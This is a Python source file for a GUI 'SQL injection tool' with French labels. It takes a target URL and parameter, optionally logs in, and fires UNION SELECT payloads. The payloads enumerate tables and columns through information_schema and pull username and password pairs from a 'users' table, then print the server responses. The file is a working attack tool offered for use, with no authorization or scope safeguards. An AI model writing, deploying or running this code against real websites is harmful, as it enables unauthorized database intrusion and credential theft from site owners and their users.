import tkinter as tk
import customtkinter as ctk
from tkinter import scrolledtext, messagebox
import requests
from requests.exceptions import RequestException
from threading import Thread

def launch_sql_injection_tool(root, return_to_home):
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")

    sql_frame = ctk.CTkFrame(root)
    sql_frame.pack(fill="both", expand=True, padx=20, pady=20)

    header = ctk.CTkFrame(sql_frame)
    header.pack(fill="x", padx=20, pady=(20, 40))
    
    title_label = ctk.CTkLabel(
        header,
        text="Outil d'Injection SQL",
        font=("Roboto", 24, "bold")
    )
    title_label.pack(pady=10)

    input_frame = ctk.CTkFrame(sql_frame)
    input_frame.pack(fill="x", padx=40, pady=20)

    input_frame.grid_columnconfigure(0, weight=1)
    input_frame.grid_columnconfigure(1, weight=1)

    ctk.CTkLabel(
        input_frame,
        text="URL cible:",
        font=("Roboto", 14)
    ).grid(row=0, column=0, pady=(10, 0), padx=10, sticky="w")
    
    entry_url = ctk.CTkEntry(
        input_frame,
        width=300,
        height=35,
        font=("Roboto", 12),
        placeholder_text="https://exemple.com"
    )
    entry_url.grid(row=1, column=0, pady=(5, 15), padx=10)

    ctk.CTkLabel(
        input_frame,
        text="Paramètre d'entrée:",
        font=("Roboto", 14)
    ).grid(row=0, column=1, pady=(10, 0), padx=10, sticky="w")
    
    entry_param = ctk.CTkEntry(
        input_frame,
        width=300,
        height=35,
        font=("Roboto", 12),
        placeholder_text="id"
    )
    entry_param.grid(row=1, column=1, pady=(5, 15), padx=10)

    auth_frame = ctk.CTkFrame(sql_frame)
    auth_frame.pack(fill="x", padx=40, pady=(0, 20))

    auth_label = ctk.CTkLabel(
        auth_frame,
        text="Authentification (optionnelle)",
        font=("Roboto", 16, "bold")
    )
    auth_label.pack(pady=(10, 20))

    auth_fields = ctk.CTkFrame(auth_frame)
    auth_fields.pack(fill="x", padx=10, pady=(0, 10))
    auth_fields.grid_columnconfigure(0, weight=1)
    auth_fields.grid_columnconfigure(1, weight=1)

    ctk.CTkLabel(
        auth_fields,
        text="Nom d'utilisateur:",
        font=("Roboto", 14)
    ).grid(row=0, column=0, pady=(5, 0), padx=10, sticky="w")
    
    entry_username = ctk.CTkEntry(
        auth_fields,
        width=300,
        height=35,
        font=("Roboto", 12),
        placeholder_text="utilisateur"
    )
    entry_username.grid(row=1, column=0, pady=(5, 15), padx=10)

    ctk.CTkLabel(
        auth_fields,
        text="Mot de passe:",
        font=("Roboto", 14)
    ).grid(row=0, column=1, pady=(5, 0), padx=10, sticky="w")
    
    entry_password = ctk.CTkEntry(
        auth_fields,
        width=300,
        height=35,
        font=("Roboto", 12),
        placeholder_text="••••••••",
        show="•"
    )
    entry_password.grid(row=1, column=1, pady=(5, 15), padx=10)

    options_frame = ctk.CTkFrame(sql_frame)
    options_frame.pack(fill="x", padx=40, pady=(0, 20))

    tables_var = ctk.BooleanVar(value=True)
    columns_var = ctk.BooleanVar(value=True)
    data_var = ctk.BooleanVar(value=True)
    
    ctk.CTkCheckBox(
        options_frame,
        text="Scanner les tables",
        variable=tables_var,
        font=("Roboto", 12)
    ).pack(side="left", padx=10)
    
    ctk.CTkCheckBox(
        options_frame,
        text="Scanner les colonnes",
        variable=columns_var,
        font=("Roboto", 12)
    ).pack(side="left", padx=10)
    
    ctk.CTkCheckBox(
        options_frame,
        text="Extraire les données",
        variable=data_var,
        font=("Roboto", 12)
    ).pack(side="left", padx=10)

    button_frame = ctk.CTkFrame(sql_frame)
    button_frame.pack(pady=20)

    ctk.CTkButton(
        button_frame,
        text="Démarrer l'injection",
        command=lambda: Thread(target=start_injection, args=(
            entry_url.get(), entry_param.get(), log_text,
            entry_username.get(), entry_password.get(),
            tables_var.get(), columns_var.get(), data_var.get()
        )).start(),
        font=("Roboto", 14),
        width=200,
        height=40
    ).pack(side="left", padx=10)

    ctk.CTkButton(
        button_frame,
        text="Retour à l'accueil",
        command=lambda: navigate_home(sql_frame, root, return_to_home),
        font=("Roboto", 14),
        width=200,
        height=40
    ).pack(side="left", padx=10)

    log_frame = ctk.CTkFrame(sql_frame)
    log_frame.pack(fill="both", expand=True, padx=40, pady=20)

    log_text = scrolledtext.ScrolledText(
        log_frame,
        width=70,
        height=15,
        font=("Consolas", 11),
        bg="#2b2b2b",
        fg="#ffffff"
    )
    log_text.pack(fill="both", expand=True, padx=10, pady=10)
    
    log_text.tag_configure("title", foreground="#63c5ea", font=("Consolas", 11, "bold"))
    log_text.tag_configure("success", foreground="#00ff00")
    log_text.tag_configure("error", foreground="#ff6b6b")
    log_text.tag_configure("warning", foreground="#ffd700")
    log_text.tag_configure("info", foreground="#63c5ea")
    log_text.tag_configure("data", foreground="#ff69b4")

def start_injection(url, param, log_text, username, password, scan_tables, scan_columns, scan_data):
    if not url or not param:
        messagebox.showerror("Erreur", "Veuillez entrer une URL et un paramètre d'entrée.")
        return

    log_text.delete(1.0, tk.END)
    
    log_text.insert(tk.END, "=== DÉMARRAGE DU TEST D'INJECTION SQL ===\n\n", "title")
    log_text.insert(tk.END, f"Cible : {url}\n", "info")
    log_text.insert(tk.END, f"Paramètre : {param}\n", "info")
    log_text.update()

    session = requests.Session()

    if username and password:
        log_text.insert(tk.END, "\n[ Tentative d'authentification ]\n", "title")
        try:
            login_url = f"{url}/login"
            login_data = {'username': username, 'password': password}
            response = session.post(login_url, data=login_data)
            log_text.insert(tk.END, "[+] Connexion réussie\n", "success")
        except RequestException as e:
            log_text.insert(tk.END, f"[-] Erreur d'authentification : {str(e)}\n", "error")
        log_text.update()

    payloads = []
    
    if scan_tables:
        payloads.append({
            "name": "Tables",
            "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables --"
        })
    
    if scan_columns:
        payloads.append({
            "name": "Colonnes",
            "payload": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --"
        })
    
    if scan_data:
        payloads.append({
            "name": "Données",
            "payload": "' UNION SELECT username,password FROM users --"
        })

    for payload_info in payloads:
        log_text.insert(tk.END, f"\n[ Test {payload_info['name']} ]\n", "title")
        try:
            injection_url = f"{url}?{param}={payload_info['payload']}"
            response = session.get(injection_url)
            
            if response.status_code == 200:
                log_text.insert(tk.END, f"[+] Requête réussie\n", "success")
                if len(response.text) > 500:
                    content = response.text[:500] + "...\n"
                else:
                    content = response.text + "\n"
                log_text.insert(tk.END, f"Résultat:\n{content}", "data")
            else:
                log_text.insert(tk.END, f"[-] Échec de la requête (Code {response.status_code})\n", "error")
                
        except RequestException as e:
            log_text.insert(tk.END, f"[-] Erreur : {str(e)}\n", "error")
        log_text.update()

    log_text.insert(tk.END, "\n=== TEST TERMINÉ ===\n", "title")
    log_text.see(tk.END)

def navigate_home(current_frame, root, return_to_home):
    current_frame.pack_forget()
    return_to_home()

if __name__ == "__main__":
    root = ctk.CTk()
    root.title("Outil d'Injection SQL")
    root.geometry("800x600")
    launch_sql_injection_tool(root, lambda: None)
    root.mainloop()